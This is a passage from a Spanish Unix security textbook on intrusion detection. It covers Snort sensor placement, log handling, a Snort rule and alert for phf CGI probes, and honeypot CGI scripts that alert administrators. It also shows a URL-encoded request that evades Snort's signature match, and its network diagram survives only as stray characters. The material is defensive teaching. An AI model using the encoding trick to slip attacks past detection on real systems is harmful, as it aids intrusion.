&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-d&#x00A0;&#x0022;$DIRLOG&#x0022;&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mkdir&#x00A0;-p&#x00A0;&#x0022;$DIRLOG&#x0022;
&#x00A0;fi
&#x00A0;cd&#x00A0;$DIRLOG
&#x00A0;mv&#x00A0;alert&#x00A0;alert-$FECHA
&#x00A0;touch&#x00A0;alert
&#x00A0;chmod&#x00A0;600&#x00A0;alert
&#x00A0;kill&#x00A0;-HUP&#x00A0;&#x2018;cat&#x00A0;/var/run/snort&#x005F;$IF.pid&#x2018;
&#x00A0;compress&#x00A0;alert-$FECHA
&#x00A0;anita:~#
</literallayout>
<!--l. 1285--><para>Independientemente de la rotaci&#x00F3;n de logs que llevemos a cabo en cada sensor, suele resultar interesante
centralizar todos los logs generados en un s&#x00F3;lo sistema (a veces se le denomina maestro o master),
aunque s&#x00F3;lo sea para realizar estad&#x02CA;&#x0131;sticas, seguimientos de m&#x00E1;quinas atacantes y atacadas, o
simplemente un &#x2018;top ten&#x2019; de piratas. Para ello podemos establecer relaciones de con&#xFB01;anza entre los
sensores y ese maestro para que puedan conectarse entre s&#x02CA;&#x0131; sin necesidad de contrase~nas y, de
forma autom&#x00E1;tica, transferir los logs almacenados y rotados. Por supuesto, a estas alturas dicha
relaci&#x00F3;n no la estableceremos mediante la de&#xFB01;nici&#x00F3;n de m&#x00E1;quinas con&#xFB01;ables en archivos .rhosts o
similares, ni con las herramientas r-<informalequation><graphic 
fileref="unixsec324x.gif"></graphic></informalequation>, sino mediante SSH y las claves p&#x00FA;blicas y privadas de
cada m&#x00E1;quina. Aparte de una mayor seguridad (no autenticamos a una m&#x00E1;quina simplemente
por su direcci&#x00F3;n o nombre, algo f&#x00E1;cilmente falseable), siguiendo un mecanismo de este estilo
conseguimos que todas las comunicaciones entre sistemas se realicen de forma cifrada, algo
que aqu&#x02CA;&#x0131; es muy importante: cualquier informaci&#x00F3;n relativa a potenciales ataques o respuestas
autom&#x00E1;ticas a los mismos se ha de considerar como con&#xFB01;dencial, por lo que ser&#x02CA;&#x0131;a un grave error
echar todo nuestro trabajo a perder simplemente porque alguien sea capaz de esnifar dicho
tr&#x00E1;&#xFB01;co.
<!--br/-->
<!--br/-->Volviendo a nuestras cuestiones iniciales, tambi&#x00E9;n deb&#x02CA;&#x0131;amos decidir d&#x00F3;nde situar l&#x00F3;gicamente al sensor; por
ejemplo, una cuesti&#x00F3;n t&#x02CA;&#x0131;pica es si debemos emplazarlo detr&#x00E1;s o delante del &#xFB01;rewall que protege a nuestra red.
En principio, si dejamos que el sensor analice el tr&#x00E1;&#xFB01;co antes de que sea &#xFB01;ltrado en el cortafuegos, estaremos
en disposici&#x00F3;n de detectar todos los ataques reales que se lanzan contra nuestra red, sin ning&#x00FA;n tipo de
&#xFB01;ltrado que pueda detener las actividades de un pirata; no obstante, probablemente lo que m&#x00E1;s nos
interesar&#x00E1; no es detectar todos estos intentos de ataque (aunque nunca est&#x00E1; de m&#x00E1;s permanecer informado en
este sentido), sino detectar el tr&#x00E1;&#xFB01;co sospechoso que atraviesa nuestro &#xFB01;rewall y que puede comprometer a
nuestros servidores. Por tanto, es recomendable (<citation>[?]</citation>) emplazar el sensor de nuestro sistema de detecci&#x00F3;n
de intrusos en la zona protegida; de cualquier forma, los potenciales ataques que no lleguen
al mismo quedar&#x00E1;n registrados en los logs del cortafuegos, e incluso ser&#x00E1;n neutralizados en el
mismo.
<!--br/-->
<!--br/-->Como el sensor ha de analizar todo el tr&#x00E1;&#xFB01;co dirigido a las m&#x00E1;quinas protegidas, si nos encontramos en un
entorno donde dichas m&#x00E1;quinas se conecten mediante un concentrador (hub) o mediante otras arquitecturas
en las que cualquiera de ellas vea (o pueda ver) el tr&#x00E1;&#xFB01;co de las dem&#x00E1;s, no hay muchos problemas de decisi&#x00F3;n
sobre d&#x00F3;nde situar al sensor: lo haremos en cualquier parte del segmento. Sin embargo, si nuestros sistemas

se conectan con un switch la cuesti&#x00F3;n se complica un poco, ya que en las bocas de este elemento se ver&#x00E1;
&#x00FA;nicamente el tr&#x00E1;&#xFB01;co dirigido a las m&#x00E1;quinas que est&#x00E9;n conectadas a cada una de ellas; en este caso, tenemos
varias opciones. Una de ellas puede ser modi&#xFB01;car por completo &#x2013; con todo lo que esto implica &#x2013;
nuestra arquitectura de red para integrar un concentrador por el que pasen los paquetes ya
&#xFB01;ltrados antes de llegar a las m&#x00E1;quinas del switch, tal y como se muestra en la &#xFB01;gura  <ulink 
  url="#x1-2900012"  ><!--ref: switch--></ulink>. No
obstante, suelen existir alternativas m&#x00E1;s sencillas y c&#x00F3;modas, como la replicaci&#x00F3;n de puertos que se
puede con&#xFB01;gurar en la mayor&#x02CA;&#x0131;a de switches; la idea es muy simple: todo el tr&#x00E1;&#xFB01;co dirigido a
determinada boca del switch se monitoriza y se duplica en otra boca. As&#x02CA;&#x0131;, no tenemos m&#x00E1;s que
con&#xFB01;gurar este port mirroring y replicar la boca por la que se dirige el tr&#x00E1;&#xFB01;co hacia el segmento de
m&#x00E1;quinas a monitorizar, envi&#x00E1;ndolo tambi&#x00E9;n a una segunda boca en la que conectaremos nuestro
sensor.
<!--br/--></para><figure><title/><blockquote>                          
                        
                      
                    
                  
                 
                Q
                  Q
                    Q
                      Q
                        Q
                         Q
                            
                              
                               
                                 
                                   
                                    
                                   Q
                                 Q
                               Q
                             Q
                           Q
                           Q
                     _ 
                       _ 
                          _ 
                            _ 
                               _ 
                       ?
                          ?
                            ?
                               ?
                                                          
                                                         
                                                       
                                                     
                                                   
                                                  
                                                 Q
                                                   Q
                                                     Q
                                                       Q
                                                         Q
                                                         Q
                                                            
                                                              
                                                                
                                                                  
                                                                    
                                                                     
                                                                    Q
                                                                  Q
                                                                Q
                                                              Q
                                                            Q
                                                           Q
                                                    _________ 
                                                    _________ 
                                                      ?
                                                        ?
                                                          ?
                                                           ?
                                                             ?
                                                               ?
                                                                ?
                                                     _ 
                                                       _ 
                                                         _ 
                                                          _ 
                                                            _ 
                                                              _ 
                                                                _ 
                                                     _ 
                                                       _ 
                                                         _ 
                                                         _ 
                                                          _ 
                                                            _ 
                                                              _ 
                                                                _ 
                                                           ?
                                                                _________-
                                                                        _____ 
                                                                         ____ 
                     ?
                                 ?
                    _________ 
                           ?
                                                           ?
                           ?
                                                           ?
                                        _____-
                                        _____-
                                        _____-
 _________________________________________________________ SENSORSWITCHHUBSWITCHFWFW
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-2900012"  ></anchor>Figura&#x00A0;18.2</title><para>Situaci&#x00F3;n del sensor</para></blockquote>
  </blockquote></figure>
<!--br/-->Para acabar con los comentarios sobre d&#x00F3;nde y c&#x00F3;mo situar al sensor de nuestro sistema detector de intrusos,
un &#x00FA;ltimo apunte: quiz&#x00E1;s nos conviene recordar que el interfaz por el que se analiza el tr&#x00E1;&#xFB01;co
(hablando claro, por el que se esnifan las tramas) no tiene por qu&#x00E9; tener direcci&#x00F3;n IP. Perfectamente
podemos tener un interfaz levantado e inicializado pero sin asignarle ninguna direcci&#x00F3;n. Esto
nos puede resultar &#x00FA;til si no nos interesa que en el segmento protegido se detecte una nueva
m&#x00E1;quina, o simplemente si no queremos que nuestro sensor sea alcanzable de alguna forma por el
resto de sistemas de su dominio de colisi&#x00F3;n. Para nuestra comodidad (por ejemplo, a la hora
de centralizar logs de diferentes sensores) podemos usar una m&#x00E1;quina con dos interfaces, una
escuchando todo el tr&#x00E1;&#xFB01;co y la otra con&#xFB01;gurada de forma normal, que ser&#x00E1; por la que accedamos al
sistema.
  </section><!--end subsection--><!--l. 1432--><section 
role="subsection"><title><abbrev role="title-mark">18.8.3</abbrev><anchor 
   id="x1-29100018.8.3"  ></anchor>IDS en la m&#x00E1;quina</title>
<!--l. 1433--><para>  Tras leer la secci&#x00F3;n anterior seguramente habr&#x00E1; quedado claro que un correcto esquema de
detecci&#x00F3;n de intrusos basado en red es vital para proteger cualquier sistema; con frecuencia suele
ser el punto m&#x00E1;s importante, que m&#x00E1;s ataques detecta, y donde se suelen emplazar la mayor&#x02CA;&#x0131;a
de sistemas de detecci&#x00F3;n que existen instalados en entornos reales hoy en d&#x02CA;&#x0131;a. No obstante,
esta enorme importancia suele degenerar en un error bastante grave: en muchos entornos los
responsables de seguridad, a la hora de trabajar con IDSes, se limitan a instalar diversos sensores
de detecci&#x00F3;n basados en red en cada segmento a proteger, creyendo que as&#x02CA;&#x0131; son capaces de

detectar la mayor&#x02CA;&#x0131;a de ataques. Y eso suele generar una falsa sensaci&#x00F3;n de seguridad grave, ya
que a la hora de lanzar ciertos ataques un pirata puede eludir f&#x00E1;cilmente a estos sensores; los
sensores de detecci&#x00F3;n en nuestros segmentos de red son importantes, pero no son la panacea. Para
comprobarlo, volvamos a nuestro ejemplo anterior, en el que un atacante trata de descubrir
vulnerabilidades en nuestros servidores HTTP: si recordamos d&#x00F3;nde nos hab&#x02CA;&#x0131;amos quedado, el
pirata estaba lanzando un escaneador de vulnerabilidades web contra el puerto 80 de nuestro
servidor corporativo; el esquema de detecci&#x00F3;n implantado en el cortafuegos no percibir&#x00E1; nada
extra~no, pero el sensor ubicado en el segmento donde se encuentra el servidor sin duda ver&#x00E1;
patrones que denotan un ataque. Por ejemplo, en el momento en que el esc&#x00E1;ner compruebe
la existencia en el servidor de un CGI denominado phf, SNORT generar&#x00E1; una alerta similar a
esta:

     </para><literallayout role="verbatim">
&#x00A0;[**]&#x00A0;IDS128&#x00A0;-&#x00A0;CVE-1999-0067&#x00A0;-&#x00A0;CGI&#x00A0;phf&#x00A0;attempt&#x00A0;[**]
&#x00A0;03/10-03:29:59.834996&#x00A0;192.168.0.3:1032&#x00A0;-&#x003E;&#x00A0;192.168.0.1:80
&#x00A0;TCP&#x00A0;TTL:56&#x00A0;TOS:0x0&#x00A0;ID:5040&#x00A0;IpLen:20&#x00A0;DgmLen:58&#x00A0;DF
&#x00A0;***AP***&#x00A0;Seq:&#x00A0;0x91FA846&#x00A0;&#x00A0;Ack:&#x00A0;0x5AD9A72&#x00A0;&#x00A0;Win:&#x00A0;0x7D78&#x00A0;&#x00A0;TcpLen:&#x00A0;20
</literallayout>
<!--l. 1464--><para>Como veremos en el punto siguiente, es posible que al generar este aviso, el propio sensor decida lanzar una
respuesta autom&#x00E1;tica contra la direcci&#x00F3;n atacante (por ejemplo, bloquearla en el cortafuegos corporativo).
Pero SNORT trabaja bas&#x00E1;ndose en su base de datos de patrones de ataques; en dicha base de datos habr&#x00E1; una
regla como la siguiente:

     </para><literallayout role="verbatim">
&#x00A0;alert&#x00A0;tcp&#x00A0;$EXTERNAL&#x005F;NET&#x00A0;any&#x00A0;-&#x003E;&#x00A0;$HTTP&#x005F;SERVERS&#x00A0;80&#x00A0;(msg:&#x0022;WEB-CGI&#x00A0;phf&#x00A0;access&#x0022;;&#x005C;
&#x00A0;flags:&#x00A0;A+;&#x00A0;content:&#x0022;/phf&#x0022;;flags:&#x00A0;A+;&#x00A0;nocase;&#x00A0;reference:arachnids,128;&#x00A0;&#x005C;
&#x00A0;reference:cve,CVE-1999-0067;&#x00A0;)
</literallayout>
<!--l. 1476--><para>A grandes rasgos, esta regla viene a decir que cuando el sensor detecte una petici&#x00F3;n al puerto 80 de nuestro
servidor web en cuyo contenido se encuentre la cadena &#x2018;/phf&#x2019; levante la alerta correspondiente; de esta
forma, cuando el atacante solicite el archivo /cgi-bin/phf del servidor, SNORT &#x2018;ver&#x00E1;&#x2019; dicha
cadena en la petici&#x00F3;n y generar&#x00E1; una alarma. &#x00BF;Pero qu&#x00E9; sucede si el atacante solicita ese mismo
&#xFB01;chero pero utilizando una petici&#x00F3;n &#x2018;ofuscada&#x2019;, formada por los c&#x00F3;digos ASCII de cada car&#x00E1;cter?
Es decir, si en lugar de lanzar una petici&#x00F3;n como &#x2018;GET /cgi-bin/phf&#x2019; hace una similar a
&#x2018;GET%2f%63%67%69%2d%62%69%6e%2f%70%68%66&#x2019;. La respuesta es sencilla: la petici&#x00F3;n anterior se
&#x2018;decodi&#xFB01;ca&#x2019; en el propio servidor web, o como mucho en un proxy intermedio. Algunos detectores de
intrusos, como RealSecure, son en teor&#x02CA;&#x0131;a capaces de procesar este tipo de tr&#x00E1;&#xFB01;co y analizarlo
normalmente en busca de patrones sospechosos, pero otros muchos (SNORT en este caso) no; as&#x02CA;&#x0131;, estos
&#x00FA;ltimos no ver&#x00E1;n en ning&#x00FA;n momento la cadena &#x2018;/phf&#x2019; circulando por la red, y por tanto no
generar&#x00E1;n ninguna alarma. Parece entonces evidente que es necesario un nivel adicional en nuestro
esquema de detecci&#x00F3;n: justamente el compuesto por los sistemas basados en la propia m&#x00E1;quina a
proteger.
<!--br/-->
<!--br/-->Antes hemos hablado de los tres modelos b&#x00E1;sicos de IDSes basados en m&#x00E1;quina: veri&#xFB01;cadores de
integridad, analizadores de registros y honeypots. Parece claro que un veri&#xFB01;cador de integridad
en nuestro caso no va a resultar muy &#x00FA;til para detectar a ese atacante (esto no signi&#xFB01;ca que
no se trate de modelos necesarios y &#x00FA;tiles en otras muchas situaciones). Tendremos por tanto
que recurrir a analizadores de logs o a tarros de miel instalados en la m&#x00E1;quina. Si optamos
por los primeros, es sencillo construir un shellscript que procese los archivos generados por el
servidor web &#x2013; en nuestro caso, aunque igualmente sencillo que procesar registros del sistema o
de otras aplicaciones &#x2013; en busca de patrones que puedan denotar un ataque, como el acceso
a determinados archivos bajo el DocumentRoot. Si analizamos cualquier CGI Scanner nos
podremos hacer una idea de a qu&#x00E9; patrones debemos estar atentos: por ejemplo, intentos de
acceso a CGIs como phf o printenv, a archivos passwd, a &#xFB01;cheros fuera del DocumentRoot,
etc.
<!--br/-->
<!--br/-->Aunque analizar los registros generados por una aplicaci&#x00F3;n en busca de ciertos patrones sospechosos es una
tarea trivial, no lo es tanto el integrar ese an&#x00E1;lisis en un esquema de detecci&#x00F3;n de intrusos. Seguramente
procesar la salida de un &#x2018;tail -f&#x2019; del archivo de log correspondiente, enviando un correo electr&#x00F3;nico al
responsable de seguridad cuando se detecte una entrada sospechosa es f&#x00E1;cil, pero por poner un simple
ejemplo, &#x00BF;qu&#x00E9; sucede cuando la m&#x00E1;quina se reinicia o el &#xFB01;chero de registros se rota? &#x00BF;Es necesario
volver a entrar y lanzar de nuevo la orden correspondiente para analizar los logs? Seguramente
alguien plantear&#x00E1; que se puede plani&#xFB01;car una tarea para que peri&#x00F3;dicamente compruebe que se
est&#x00E1; procesando el archivo, y lance el an&#x00E1;lisis en caso de que no sea as&#x02CA;&#x0131;&#x2026;&#x00BF;pero hasta qu&#x00E9; punto
es esto c&#x00F3;modo? &#x00BF;qu&#x00E9; sucede con las entradas duplicadas? &#x00BF;y con los registros perdidos que
no se llegan a procesar? Evidentemente, no todo es tan sencillo como el simple &#x2018;tail -f&#x2019;
anterior.
<!--br/-->
<!--br/-->El an&#x00E1;lisis de registros generados por el sistema o por ciertas aplicaciones suele ser una excelente fuente
de informaci&#x00F3;n de cara a la detecci&#x00F3;n de actividades sospechosas en nuestros entornos, pero
no es habitual aplicar dicho an&#x00E1;lisis en un esquema de respuesta autom&#x00E1;tica ante ataques. Es
mucho m&#x00E1;s com&#x00FA;n automatizar la revisi&#x00F3;n de logs para que peri&#x00F3;dicamente (por ejemplo, cada
noche) se analicen esos registros y se env&#x02CA;&#x0131;e un mensaje de alerta por correo electr&#x00F3;nico a los
responsables de seguridad en caso de que algo anormal se detecte; evidentemente no es un
modelo que trabaje en tiempo real, pero no por ello deja de ser un esquema &#x00FA;til en la detecci&#x00F3;n de
intrusos; el &#x00FA;nico problema que se presenta a la hora de realizar el an&#x00E1;lisis suele ser la decisi&#x00F3;n de qu&#x00E9;
patrones buscar en los registros, algo que depende por completo del tipo de log que estemos

analizando.
<!--br/-->
<!--br/-->Aparte de los sistemas de detecci&#x00F3;n basados en el an&#x00E1;lisis de registros, otro esquema que podemos &#x2013; y
debemos &#x2013; implantar en cada m&#x00E1;quina son los honeypots o tarros de miel, mecanismo que nos ha de
permitir detectar ciertos ataques aunque el resto de sensores de nuestro modelo falle. Como antes hemos
comentado, hay diferentes modelos de tarros de miel, desde los simples detectores de pruebas hasta
los complejos sistemas dedicados por completo a esta tarea; para detectar ataques rutinarios
estos &#x00FA;ltimos suelen ser algo excesivo e incluso en ocasiones dif&#x02CA;&#x0131;cil no s&#x00F3;lo desde un punto de
vista estrictamente t&#x00E9;cnico, ya que no siempre podemos dedicar una m&#x00E1;quina entera a &#x2018;enga~nar&#x2019;
atacantes, aparte del tiempo necesario para con&#xFB01;gurarla correctamente, actualizarla, revisar sus
registros, etc. Esquemas te&#x00F3;ricamente m&#x00E1;s simples pueden incluso resultar m&#x00E1;s efectivos en la
pr&#x00E1;ctica.
<!--br/-->
<!--br/-->En nuestro caso no vamos a complicarnos mucho la existencia; si recordamos a nuestro atacante,
estaba lanzando un escaneo de vulnerabilidades contra nuestro servidor web; nuestro IDS
basado en red detectar&#x00E1; el ataque y en consecuencia dar&#x00E1; la voz de alarma y, adicionalmente,
ejecutar&#x00E1; una respuesta autom&#x00E1;tica contra el pirata, bloque&#x00E1;ndolo en el cortafuegos corporativo. Ese
atacante ya puede m&#x00E1;s que sospechar que tenemos un detector de intrusos basado en red que le
impide completar su escaneo, ya que en el momento que se detecta tr&#x00E1;&#xFB01;co sospechoso bloquea
por completo a la direcci&#x00F3;n origen; por tanto, un paso l&#x00F3;gico para &#x00E9;l es intentar un an&#x00E1;lisis de
vulnerabilidades &#x2018;camu&#xFB02;ado&#x2019;, bien mediante una simple codi&#xFB01;caci&#x00F3;n de peticiones bien mediante un
complejo stealth scan. De nuevo, buscar&#x00E1; la existencia de CGIs vulnerables, como /cgi-bin/phf o
/cgi-bin/printenv, y en este caso SNORT ser&#x00E1; incapaz de detectar el ataque. Pero forzosamente a nuestro
servidor web han de llegar estas peticiones, por lo que &#x00BF;qu&#x00E9; mejor forma de detectar al pirata que
en la propia m&#x00E1;quina? No tenemos m&#x00E1;s que situar en el directorio donde se ubican nuestros
CGIs un programa que nos informe si alguien intenta acceder a &#x00E9;l, tan simple como el siguiente
shellscript:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;cat&#x00A0;/web/cgi-bin/phf
&#x00A0;#!/bin/sh
&#x00A0;/bin/echo&#x00A0;&#x0022;Pirata&#x00A0;desde&#x00A0;&#x0022;$REMOTE&#x005F;ADDR&#x0022;&#x0022;|mailx&#x00A0;-s&#x00A0;&#x0022;Ataque&#x00A0;PHF&#x0022;&#x00A0;root
&#x00A0;/bin/echo&#x00A0;&#x0022;Content-type:&#x00A0;text/html&#x0022;
&#x00A0;/bin/echo&#x00A0;&#x0022;&#x0022;
&#x00A0;/bin/echo&#x00A0;&#x0022;&#x003C;HTML&#x003E;&#x003C;CENTER&#x003E;Sonrie&#x00A0;a&#x00A0;la&#x00A0;camara&#x00A0;oculta...&#x003C;/CENTER&#x003E;&#x003C;/HTML&#x003E;&#x0022;
&#x00A0;anita:~#
</literallayout>
<!--l. 1579--><para>Evidentemente la &#x2018;decepci&#x00F3;n&#x2019; del sistema anterior en un atacante durar&#x00E1; unos pocos segundos, ya que es
inmediato para &#x00E9;ste detectar que se trata de una simple trampa; si queremos algo m&#x00E1;s elaborado, tampoco
es dif&#x02CA;&#x0131;cil conseguirlo: podemos simular el comportamiento de diferentes CGIs con vulnerabilidades
conocidas de una forma muy sencilla. Por ejemplo, existen diferentes &#x2018;imitaciones&#x2019; de CGIs
vulnerables que aparentan un problema de seguridad pero que en realidad se trata de sistemas de
decepci&#x00F3;n m&#x00E1;s o menos e&#xFB01;caces; en http://www.eng.auburn.edu/users/rayh/software/phf.html
podemos encontrar una versi&#x00F3;n muy interesante del CGI phf, capaz de simular los ataques m&#x00E1;s
habituales contra el programa original de una forma bastante cre&#x02CA;&#x0131;ble &#x2013; aunque no perfecta
&#x2013;. Adem&#x00E1;s en este caso el c&#x00F3;digo en Perl es f&#x00E1;cilmente modi&#xFB01;cable, con lo que podemos desde
adecuarlo a nuestros sistemas hasta mejorar su simulaci&#x00F3;n; si lo hacemos, es muy posible que
mantengamos &#x2018;entretenidos&#x2019; incluso a piratas con conocimientos por encima de la media de
atacantes (esto lo digo por experiencia). Tambi&#x00E9;n podemos construirnos nuestros propios CGIs
que aparenten ser vulnerables, en muchos casos simplemente con unos conocimientos b&#x00E1;sicos
de programaci&#x00F3;n en shell o en Perl; por ejemplo, el c&#x00F3;digo siguiente simula el CGI printenv,
proporcionando informaci&#x00F3;n falsa sobre el sistema que parece &#x00FA;til para un atacante, y avisando
por correo electr&#x00F3;nico a los responsables de seguridad del sistema cuando alguien accede al
programa:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;cat&#x00A0;/web/cgi-bin/printenv
&#x00A0;#!/usr/bin/perl
&#x00A0;
&#x00A0;$SECUREADDRESS=&#x0022;root&#x0022;;
&#x00A0;$mailprog&#x00A0;=&#x00A0;&#x2019;/usr/lib/sendmail&#x2019;;
&#x00A0;
&#x00A0;print&#x00A0;&#x0022;Content-type:&#x00A0;text/html&#x005C;n&#x005C;n&#x0022;;
&#x00A0;print&#x00A0;&#x0022;SERVER&#x005F;SOFTWARE&#x00A0;=&#x00A0;Apache/1.3.12&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;GATEWAY&#x005F;INTERFACE&#x00A0;=&#x00A0;CGI/1.2&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;DOCUMENT&#x005F;ROOT&#x00A0;=&#x00A0;/usr/local/httpd/htdocs&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;REMOTE&#x005F;ADDR&#x00A0;=&#x00A0;$ENV{&#x2019;REMOTE&#x005F;ADDR&#x2019;}&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;SERVER&#x005F;PROTOCOL&#x00A0;=&#x00A0;$ENV{&#x2019;SERVER&#x005F;PROTOCOL&#x2019;}&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;SERVER&#x005F;SIGNATURE&#x00A0;=&#x00A0;&#x003C;br&#x003E;&#x003C;i&#x003E;Apache/1.3.9&#x00A0;Server&#x00A0;at&#x00A0;&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;$ENV{&#x2019;SERVER&#x005F;NAME&#x2019;}&#x003C;/i&#x003E;&#x003C;br&#x003E;&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;REQUEST&#x005F;METHOD&#x00A0;=&#x00A0;GET&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;QUERY&#x005F;STRING&#x00A0;=&#x00A0;$ENV{&#x2019;QUERY&#x005F;STRING&#x2019;}&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;HTTP&#x005F;USER&#x005F;AGENT&#x00A0;=&#x00A0;$ENV{&#x2019;HTTP&#x005F;USER&#x005F;AGENT&#x2019;}&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;PATH&#x00A0;=&#x00A0;/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/local/bin&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;HTTP&#x005F;ACCEPT&#x00A0;=&#x00A0;image/gif,&#x00A0;image/x-xbitmap,&#x00A0;image/jpeg&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;HTTP&#x005F;CONNECTION&#x00A0;=&#x00A0;Keep-Alive&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;REMOTE&#x005F;PORT&#x00A0;=&#x00A0;$ENV{&#x2019;REMOTE&#x005F;PORT&#x2019;}&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;SERVER&#x005F;ADDR&#x00A0;=&#x00A0;$ENV{&#x2019;SERVER&#x005F;ADDR&#x2019;}&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;HTTP&#x005F;ACCEPT&#x005F;LANGUAGE&#x00A0;=&#x00A0;en&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;SCRIPT&#x005F;NAME&#x00A0;=&#x00A0;/cgi-bin/printenv&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;HTTP&#x005F;ACCEPT&#x005F;ENCODING&#x00A0;=&#x00A0;gzip&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;SCRIPT&#x005F;FILENAME&#x00A0;=&#x00A0;/usr/local/httpd/cgi-bin/printenv&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;SERVER&#x005F;NAME&#x00A0;=&#x00A0;$ENV{&#x2019;SERVER&#x005F;NAME&#x2019;}&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;REQUEST&#x005F;URI&#x00A0;=&#x00A0;/cgi-bin/printenv&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;HTTP&#x005F;ACCEPT&#x005F;CHARSET&#x00A0;=&#x00A0;iso-8859-1,&#x00A0;utf-8&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;SERVER&#x005F;PORT&#x00A0;=&#x00A0;$ENV{&#x2019;SERVER&#x005F;PORT&#x2019;}&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;HTTP&#x005F;HOST&#x00A0;=&#x00A0;$ENV{&#x2019;HTTP&#x005F;HOST&#x2019;}&#x003C;br&#x003E;&#x0022;;
&#x00A0;print&#x00A0;&#x0022;SERVER&#x005F;ADMIN&#x00A0;=&#x00A0;webmaster&#x003C;br&#x003E;&#x0022;;
&#x00A0;
&#x00A0;#&#x00A0;Enviamos&#x00A0;correo
&#x00A0;open&#x00A0;(MAIL,&#x00A0;&#x0022;|$mailprog&#x00A0;$SECUREADDRESS&#x0022;)&#x00A0;or&#x00A0;die&#x00A0;&#x0022;Can&#x2019;t&#x00A0;open&#x00A0;$mailprog!&#x005C;n&#x0022;;
&#x00A0;print&#x00A0;MAIL&#x00A0;&#x0022;To:&#x00A0;$SECUREADDRESS&#x005C;n&#x0022;;
&#x00A0;print&#x00A0;MAIL&#x00A0;&#x0022;From:&#x00A0;PRINTENV&#x00A0;Watcher&#x00A0;&#x003C;$SECUREADDRESS&#x003E;&#x005C;n&#x0022;;
&#x00A0;print&#x00A0;MAIL&#x00A0;&#x0022;Subject:&#x00A0;[/CGI-BIN/PRINTENV]&#x00A0;$ENV{&#x2019;REMOTE&#x005F;HOST&#x2019;}&#x00A0;$action&#x005C;n&#x005C;n&#x0022;;
&#x00A0;print&#x00A0;MAIL&#x00A0;&#x0022;&#x005C;n&#x0022;;
&#x00A0;print&#x00A0;MAIL&#x00A0;&#x00A0;&#x0022;--------------------------------------------------------&#x005C;n&#x0022;;
&#x00A0;print&#x00A0;MAIL&#x00A0;&#x0022;Remote&#x00A0;host:&#x00A0;$ENV{&#x2019;REMOTE&#x005F;ADDR&#x2019;}&#x005C;n&#x0022;;
&#x00A0;print&#x00A0;MAIL&#x00A0;&#x0022;Server:&#x00A0;$ENV{&#x2019;SERVER&#x005F;NAME&#x2019;}&#x005C;n&#x0022;;
&#x00A0;print&#x00A0;MAIL&#x00A0;&#x0022;Remote&#x00A0;IP&#x00A0;address:&#x00A0;$ENV{&#x2019;REMOTE&#x005F;ADDR&#x2019;}&#x005C;n&#x0022;;
&#x00A0;print&#x00A0;MAIL&#x00A0;&#x0022;HTTP&#x00A0;Referer:&#x00A0;$ENV{&#x2019;HTTP&#x005F;REFERER&#x2019;}&#x005C;n&#x0022;;
&#x00A0;print&#x00A0;MAIL&#x00A0;&#x0022;Query&#x00A0;String:&#x00A0;$ENV{&#x2019;QUERY&#x005F;STRING&#x2019;}&#x005C;n&#x0022;;
&#x00A0;print&#x00A0;MAIL&#x00A0;&#x0022;&#x005C;n--------------------------------------------------------&#x005C;n&#x0022;;
&#x00A0;close(MAIL);
&#x00A0;exit;
&#x00A0;anita:/#
</literallayout>
<!--l. 1656--><para>

  </para></section><!--end subsection--><!--l. 1656--><section 
role="subsection"><title><abbrev role="title-mark">18.8.4</abbrev><anchor 
   id="x1-29200018.8.4"  ></anchor>Estrategias de respuesta</title>
<!--l. 1657--><para>  Una pregunta importante que nos hab&#x02CA;&#x0131;amos realizado con respecto a nuestro esquema de deteccci&#x00F3;n de
intrusos (en concreto cuando habl&#x00E1;bamos de SNORT) era qu&#x00E9; hacer con la informaci&#x00F3;n obtenida del mismo;
como siempre, tenemos varias posibilidades. Por un lado, podemos procesarla manualmente de
forma peri&#x00F3;dica (por ejemplo cada ma~nana) y en funci&#x00F3;n de los datos que nuestros sensores
hayan recogido tomar una determinada acci&#x00F3;n: bloquear las direcciones atacantes en el &#xFB01;rewall
corporativo, enviar un correo de queja a los responsables de dichas direcciones (por desgracia esto no
suele resultar muy &#x00FA;til), realizar informes para nuestros superiores, o simplemente no hacer
nada. Depender&#x00E1; casi por completo de la pol&#x02CA;&#x0131;tica de seguridad que sigamos o que tengamos que
seguir.
<!--br/-->
